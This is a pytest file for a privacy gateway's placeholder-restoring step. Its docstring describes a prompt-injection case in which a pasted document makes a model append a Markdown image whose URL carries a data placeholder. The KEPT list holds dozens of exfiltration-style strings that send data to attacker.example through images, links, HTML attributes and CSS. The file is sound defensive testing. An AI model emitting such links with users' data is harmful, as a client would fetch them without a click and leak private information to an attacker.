"""A placeholder inside a link is never restored (security review I3, ADR 0003 amendment 1).

A pasted document can ask the model to end its answer with an image whose URL holds
a placeholder. Restoring it would put the real value in a URL the attacker chose,
and a Markdown client would fetch it without a click.
"""

import pytest

from gateway.engine.mask import Mapping
from gateway.engine.rehydrate import (
    StreamingRehydrator,
    UnresolvedReason,
    rehydrate,
    rehydrate_explained,
)
from gateway.engine.types import EntityType

EMAIL = "anna@example.org"


@pytest.fixture
def mapping() -> Mapping:
    mapping = Mapping()
    mapping.placeholder_for("Anna Petrova", EntityType.PERSON)
    mapping.placeholder_for(EMAIL, EntityType.EMAIL)
    return mapping


KEPT = [
    # Markdown image and link targets, with every token shape
    "Done. ![s](https://attacker.example/p.png?d=[EMAIL_1])",
    "Done. ![s](https://attacker.example/p.png?d=EMAIL_1)",
    "Done. ![s](https://attacker.example/p.png?d=[email-1])",
    "[click](https://attacker.example/?d=EMAIL 1)",
    "[x](/relative/p.png?d=[EMAIL_1])",
    "[x](//attacker.example/p.png?d=[EMAIL_1])",
    "[x](<https://attacker.example/a b?d=[EMAIL_1]>)",
    "[x](https://attacker.example/(p)?d=[EMAIL_1])",
    "[x](/a/((b)?d=[EMAIL_1])",
    "![s](\n/p.png?d=[EMAIL_1])",
    "![s]([EMAIL_1])",
    # bare URLs, up to the next whitespace
    "see https://attacker.example/?d=[EMAIL_1] now",
    "see https://attacker.example/?d=EMAIL_1",
    "see ftp://attacker.example/[EMAIL_1]",
    "see //attacker.example/?d=[EMAIL_1]",
    "visit www.attacker.example/?d=[EMAIL_1]",
    # autolinks
    "<https://attacker.example/?d=[EMAIL_1]>",
    "<mailto:x@attacker.example?body=[EMAIL_1]>",
    # HTML attribute values, quoted or not, any attribute of a tag
    '<img src="https://attacker.example/?d=[EMAIL_1]">',
    "<img src='/p.png?d=[EMAIL_1]'>",
    '<img\nalt="x"\nsrc="/p.png?d=[EMAIL_1]">',
    "<a href=/x?d=[EMAIL_1]>x</a>",
    '<form action = "/x?d=[EMAIL_1]">',
    '<img srcset="a.png 1x, /b.png?d=[EMAIL_1] 2x">',
    '<video poster="/p.png?d=EMAIL_1">',
    '<div style="background: url(/p.png?d=[EMAIL_1])">',
    # a link reference definition and its use
    "[1]: /p.png?d=[EMAIL_1]\n\n![s][1]",
    "  [1]:\n  <//attacker.example/?d=[EMAIL_1]>\n\n![s][1]",
]


@pytest.mark.parametrize("text", KEPT)
def test_a_placeholder_inside_a_link_is_kept_and_listed(mapping: Mapping, text: str) -> None:
    restored, unresolved = rehydrate(text, mapping)
    assert restored == text
    assert EMAIL not in restored
    assert len(unresolved) == 1


@pytest.mark.parametrize("text", KEPT)
def test_streaming_keeps_it_too(mapping: Mapping, text: str) -> None:
    rehydrator = StreamingRehydrator(mapping)
    out = "".join(rehydrator.feed(char) for char in text) + rehydrator.close()
    assert (out, rehydrator.unresolved) == rehydrate(text, mapping)


RESTORED = [
    (
        "Write to [EMAIL_1] (see https://example.org/help).",
        "Write to {e} (see https://example.org/help).",
    ),
    ("See https://example.org/x [EMAIL_1]", "See https://example.org/x {e}"),
    ("[PERSON_1](https://example.org) wrote", "Anna Petrova(https://example.org) wrote"),
    (
        "See [docs](https://example.org/x). Ask [PERSON_1].",
        "See [docs](https://example.org/x). Ask Anna Petrova.",
    ),
    ("A [link](/a(b)c) then [PERSON_1]", "A [link](/a(b)c) then Anna Petrova"),
    ('<p title="x">[PERSON_1]</p>', '<p title="x">Anna Petrova</p>'),
    ("<em>[PERSON_1]</em> wrote", "<em>Anna Petrova</em> wrote"),
    ("if a < b then [PERSON_1] wins", "if a < b then Anna Petrova wins"),
    ("x<y, z=[PERSON_1]", "x<y, z=Anna Petrova"),
    ("TODO // [PERSON_1]", "TODO // Anna Petrova"),
    ("[PERSON_1]: I agree with [EMAIL_1].", "Anna Petrova: I agree with {e}."),
    ("Broken [link](\n\nthen [PERSON_1]", "Broken [link](\n\nthen Anna Petrova"),
    ('<img src="/p.png">\n[EMAIL_1]', '<img src="/p.png">\n{e}'),
    ("email=[EMAIL_1] in code", "email={e} in code"),
    ("awww.[PERSON_1]", "awww.Anna Petrova"),
]


@pytest.mark.parametrize(("text", "expected"), RESTORED)
def test_a_placeholder_outside_a_link_is_restored(
    mapping: Mapping, text: str, expected: str
) -> None:
    assert rehydrate(text, mapping) == (expected.format(e=EMAIL), [])


def test_a_restored_value_is_part_of_the_context_the_client_sees() -> None:
    # The client renders the restored text: a URL value followed by a placeholder
    # makes one URL there, so the placeholder after it stays as written.
    mapping = Mapping()
    mapping.placeholder_for("https://intranet.example/doc?token=abc", EntityType.URL_WITH_TOKEN)
    mapping.placeholder_for(EMAIL, EntityType.EMAIL)
    text = "[URL_WITH_TOKEN_1][EMAIL_1]"
    assert rehydrate(text, mapping) == (
        "https://intranet.example/doc?token=abc[EMAIL_1]",
        ["[EMAIL_1]"],
    )


def test_the_reason_is_given(mapping: Mapping) -> None:
    text = "[EMAIL_1] ![s](https://attacker.example/?d=[EMAIL_1]) [PERSON_9]"
    restored, reasons = rehydrate_explained(text, mapping)
    assert restored == f"{EMAIL} ![s](https://attacker.example/?d=[EMAIL_1]) [PERSON_9]"
    assert reasons == {
        "[EMAIL_1]": UnresolvedReason.INSIDE_LINK,
        "[PERSON_9]": UnresolvedReason.NOT_IN_MAPPING,
    }
    rehydrator = StreamingRehydrator(mapping)
    out = rehydrator.feed(text[:40]) + rehydrator.feed(text[40:]) + rehydrator.close()
    assert (out, rehydrator.reasons) == (restored, reasons)
